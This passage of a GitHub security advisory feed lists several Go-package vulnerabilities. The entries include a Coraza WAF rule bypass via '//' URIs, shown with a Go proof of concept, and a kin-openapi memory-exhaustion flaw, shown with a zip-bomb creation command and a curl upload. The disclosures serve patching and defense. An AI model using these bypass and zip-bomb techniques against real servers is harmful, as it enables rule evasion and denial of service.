        <title type="html"><![CDATA[[github.com/jptosso/coraza-waf] OWASP Coraza WAF has parser confusion which leads to wrong URI in `REQUEST_FILENAME`]]></title>
        <id>https://github.com/advisories/GHSA-q9f5-625g-xm39</id>
        <link href="https://github.com/advisories/GHSA-q9f5-625g-xm39"/>
        <updated>2025-03-20T18:48:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>URLs starting with <code>//</code> are not parsed properly, and the request <code>REQUEST_FILENAME</code> variable contains a wrong value, leading to potential rules bypass.</p>
<h3 id="details">Details</h3>
<p>If a request is made on an URI starting with <code>//</code>, coraza will set a wrong value in <code>REQUEST_FILENAME</code>.
For example, if the URI <code>//bar/uploads/foo.php?a=b</code> is passed to coraza: , <code>REQUEST_FILENAME</code> will be set to <code>/uploads/foo.php</code>.</p>
<p>The root cause is the usage of <code>url.Parse</code> to parse the URI in <a href="https://github.com/corazawaf/coraza/blob/8b612f4e6e18c606e371110227bc7669dc714cab/internal/corazawaf/transaction.go#L768">ProcessURI</a>.</p>
<p><code>url.Parse</code> can parse both absolute URLs (starting with a scheme) or relative ones (just the path). 
<code>//bar/uploads/foo.php</code> is a valid absolute URI (the scheme is empty), <code>url.Parse</code> will consider <code>bar</code> as the host and the path will be set to <code>/uploads/foo.php</code>.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "net/url"
    "os"

    "github.com/corazawaf/coraza/v3"
)

const testRule = `
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRule REQUEST_FILENAME "@rx /bar/uploads/.*\.(h?ph(p|tm?l?|ar)|module|shtml)" "id:1,phase:1,deny"
`

func main() {
    var testURL = "//bar/uploads/foo.php"

    if os.Getenv("TEST_URL") != "" {
        testURL = os.Getenv("TEST_URL")
    }

    fmt.Printf("Testing URL: %s\n", testURL)

    config := coraza.NewWAFConfig().WithDirectives(testRule)

    waf, err := coraza.NewWAF(config)

    if err != nil {
        panic(err)
    }

    tx := waf.NewTransaction()

    tx.ProcessURI(testURL, "GET", "HTTP/1.1")

    in := tx.ProcessRequestHeaders()

    if in != nil {
        fmt.Printf("%+v\n", in)
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Potential bypass of rules using <code>REQUEST_FILENAME</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/corazawaf/coraza/security/advisories/GHSA-q9f5-625g-xm39">https://github.com/corazawaf/coraza/security/advisories/GHSA-q9f5-625g-xm39</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29914">https://nvd.nist.gov/vuln/detail/CVE-2025-29914</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/4722c9ad0d502abd56b8d6733c6b47eb4111742d">https://github.com/corazawaf/coraza/commit/4722c9ad0d502abd56b8d6733c6b47eb4111742d</a></li>
<li><a href="https://github.com/advisories/GHSA-q9f5-625g-xm39">https://github.com/advisories/GHSA-q9f5-625g-xm39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9f5-625g-xm39</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-20T18:48:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/console] OpenShift Console Has a Path Traversal Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-69x5-hjg4-m267</id>
        <link href="https://github.com/advisories/GHSA-69x5-hjg4-m267"/>
        <updated>2025-03-20T18:10:13.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in the OpenShift Console, an endpoint for plugins to serve resources in multiple languages: /locales/resources.json. This endpoint's lng and ns parameters are used to construct a filepath in pkg/plugins/handlers unsafely.go#L112 Because of this unsafe filepath construction, an authenticated user can manipulate the path to retrieve any JSON files on the console's pod by using sequences of ../ and valid directory paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7631">https://nvd.nist.gov/vuln/detail/CVE-2024-7631</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-7631">https://access.redhat.com/security/cve/CVE-2024-7631</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2296053">https://bugzilla.redhat.com/show_bug.cgi?id=2296053</a></li>
<li><a href="https://github.com/advisories/GHSA-69x5-hjg4-m267">https://github.com/advisories/GHSA-69x5-hjg4-m267</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69x5-hjg4-m267</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-19T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/hive] OpenShift Hive Has an Uncontrolled Resource Consumption Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-c392-wrgw-jjfw</id>
        <link href="https://github.com/advisories/GHSA-c392-wrgw-jjfw"/>
        <updated>2025-03-20T13:18:18.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in the Hive hibernation controller component of OpenShift Dedicated. The ClusterDeployment.hive.openshift.io/v1 resource can be created with the spec.installed field set to true, regardless of the installation status, and a positive timespan for the spec.hibernateAfter value. If a ClusterSync.hiveinternal.openshift.io/v1alpha1 resource is also created, the hive hibernation controller will enter the reconciliation loop leading to a panic when accessing a non-existing field in the ClusterDeployment’s status section, resulting in a denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25132">https://nvd.nist.gov/vuln/detail/CVE-2024-25132</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-25132">https://access.redhat.com/security/cve/CVE-2024-25132</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2260371">https://bugzilla.redhat.com/show_bug.cgi?id=2260371</a></li>
<li><a href="https://github.com/advisories/GHSA-c392-wrgw-jjfw">https://github.com/advisories/GHSA-c392-wrgw-jjfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c392-wrgw-jjfw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-19T18:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Fails to Properly Perform Viewer Role Authorization]]></title>
        <id>https://github.com/advisories/GHSA-fqrq-xmxj-v47x</id>
        <link href="https://github.com/advisories/GHSA-fqrq-xmxj-v47x"/>
        <updated>2025-03-19T21:52:51.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 9.11.x &lt;= 9.11.8 fail to properly perform authorization of the Viewer role which allows an attacker with the Viewer role configured with No Access to Reporting to still view team and site statistics.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1472">https://nvd.nist.gov/vuln/detail/CVE-2025-1472</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-fqrq-xmxj-v47x">https://github.com/advisories/GHSA-fqrq-xmxj-v47x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqrq-xmxj-v47x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-19T15:31:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Fails to Properly Perform Viewer Role Authorization]]></title>
        <id>https://github.com/advisories/GHSA-fqrq-xmxj-v47x</id>
        <link href="https://github.com/advisories/GHSA-fqrq-xmxj-v47x"/>
        <updated>2025-03-19T21:52:51.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 9.11.x &lt;= 9.11.8 fail to properly perform authorization of the Viewer role which allows an attacker with the Viewer role configured with No Access to Reporting to still view team and site statistics.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1472">https://nvd.nist.gov/vuln/detail/CVE-2025-1472</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-fqrq-xmxj-v47x">https://github.com/advisories/GHSA-fqrq-xmxj-v47x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqrq-xmxj-v47x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-19T15:31:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/getkin/kin-openapi/openapi3filter] Improper Handling of Highly Compressed Data (Data Amplification) in github.com/getkin/kin-openapi/openapi3filter]]></title>
        <id>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</id>
        <link href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9"/>
        <updated>2025-03-20T19:00:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.</p>
<h3 id="details">Details</h3>
<p>The root cause comes from the <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">ZipFileBodyDecoder</a>, which is registered <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">automatically</a> by the module (contrary to what the <a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">documentation says</a>.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the vulnerability, you can use the following OpenAPI schema:</p>
<pre><code class="language-yaml">openapi: 3.0.0
info:
  title: 'Validator'
  version: 0.0.1
paths:
  /:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              required:
                - file
              properties:
                file:
                  type: string
                  format: binary
      responses:
        '200':
          description: Created
</code></pre>
<p>And this code to validate the request (nothing fancy, it basically only calls the <code>openapi3filter.ValidateRequest</code> function`):</p>
<pre><code class="language-go">package main

import (
    "fmt"
    "log"
    "net/http"

    "github.com/getkin/kin-openapi/openapi3filter"
    legacyrouter "github.com/getkin/kin-openapi/routers/legacy"

    "github.com/getkin/kin-openapi/openapi3"
)

func handler(w http.ResponseWriter, r *http.Request) {
    loader := openapi3.NewLoader()

    doc, err := loader.LoadFromFile("schema.yaml")
    if err != nil {
        http.Error(w, "Failed to load OpenAPI document", http.StatusInternalServerError)
        return
    }

    if err := doc.Validate(r.Context()); err != nil {
        http.Error(w, "Invalid OpenAPI document", http.StatusBadRequest)
        return
    }

    router, err := legacyrouter.NewRouter(doc)
    if err != nil {
        http.Error(w, "Failed to create router", http.StatusInternalServerError)
        return
    }

    route, pathParams, err := router.FindRoute(r)
    if err != nil {
        http.Error(w, "Failed to find route", http.StatusNotFound)
        return
    }

    input := &amp;openapi3filter.RequestValidationInput{
        Request:     r,
        QueryParams: r.URL.Query(),
        Route:       route,
        PathParams:  pathParams,
    }

    if err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {
        http.Error(w, fmt.Sprintf("Request validation failed: %v", err), http.StatusBadRequest)
        return
    }

    w.Write([]byte("request ok !"))
}

func main() {
    http.HandleFunc("/", handler)
    log.Fatal(http.ListenAndServe(":8080", nil))

}
</code></pre>
<p>We also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:</p>
<pre><code class="language-shell">perl -e 'print "0" x 5000000000' &gt; /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt
</code></pre>
<p>Run the PoC provided, and upload the zip bomb with <code>curl localhost:8080/  -F file="@/tmp/bomb.zip;type=application/zip" -v</code>.</p>
<p>Observe the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) </p>
<h3 id="impact">Impact</h3>
<p>An attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.
It seems to only be exploitable if the OpenAPI schema allows for multipart upload.</p>
<h3 id="remediation">Remediation</h3>
<p>I see at least 2 potential fixes/improvements:</p>
<ul>
<li>Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)</li>
<li>Update <code>ZipFileBodyDecoder</code> to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
<li><a href="https://github.com/getkin/kin-openapi/pull/1059">https://github.com/getkin/kin-openapi/pull/1059</a></li>
<li><a href="https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1">https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1</a></li>
<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275</a></li>
<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523</a></li>
<li><a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30153">https://nvd.nist.gov/vuln/detail/CVE-2025-30153</a></li>
<li><a href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-19T18:12:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/hive] Openshift Hive Exposes VCenter Credentials via ClusterProvision]]></title>
        <id>https://github.com/advisories/GHSA-c339-mwfc-fmr2</id>
        <link href="https://github.com/advisories/GHSA-c339-mwfc-fmr2"/>
        <updated>2025-03-17T21:27:58.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Hive, a component of Multicluster Engine (MCE) and Advanced Cluster Management (ACM). This vulnerability causes VCenter credentials to be exposed in the ClusterProvision object after provisioning a VSphere cluster. Users with read access to ClusterProvision objects can extract sensitive credentials even if they do not have direct access to Kubernetes Secrets. This issue can lead to unauthorized VCenter access, cluster management, and privilege escalation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2241">https://nvd.nist.gov/vuln/detail/CVE-2025-2241</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-2241">https://access.redhat.com/security/cve/CVE-2025-2241</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2351350">https://bugzilla.redhat.com/show_bug.cgi?id=2351350</a></li>
<li><a href="https://github.com/advisories/GHSA-c339-mwfc-fmr2">https://github.com/advisories/GHSA-c339-mwfc-fmr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c339-mwfc-fmr2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-17T18:31:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/buildx] buildx allows a possible credential leakage to telemetry endpoint]]></title>
        <id>https://github.com/advisories/GHSA-m4gq-fm9h-8q75</id>
        <link href="https://github.com/advisories/GHSA-m4gq-fm9h-8q75"/>
        <updated>2025-03-17T21:51:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Some cache backends allow configuring their credentials by setting secrets directly as attribute values in <code>cache-to/cache-from</code> configuration. If this was done by the user, these secure values could be captured together with OpenTelemetry trace as part of the arguments and flags for the traced CLI command. Passing tokens to Github cache backend via environment variables or using registry authentication is not affected.</p>
<p>If you passed a token value like this and use a custom OpenTelemetry collector for computing traces you should make sure that your traces are kept secure. OpenTelemetry traces are also saved in BuildKit daemon's history records.</p>
<h3 id="patches">Patches</h3>
<p>Issue has been fixed in Buildx v0.21.3 or newer.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid passing cache backend credentials with CLI arguments. Make sure access to traces and BuildKit history records is kept secure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/docker/buildx/security/advisories/GHSA-m4gq-fm9h-8q75">https://github.com/docker/buildx/security/advisories/GHSA-m4gq-fm9h-8q75</a></li>
<li><a href="https://github.com/docker/buildx/commit/18ccba072076ddbfb0aeedd6746d7719b0729b58">https://github.com/docker/buildx/commit/18ccba072076ddbfb0aeedd6746d7719b0729b58</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0495">https://nvd.nist.gov/vuln/detail/CVE-2025-0495</a></li>
<li><a href="https://github.com/docker/buildx">https://github.com/docker/buildx</a></li>
<li><a href="https://github.com/advisories/GHSA-m4gq-fm9h-8q75">https://github.com/advisories/GHSA-m4gq-fm9h-8q75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4gq-fm9h-8q75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-17T21:27:43.000Z</published>
    </entry>
</feed>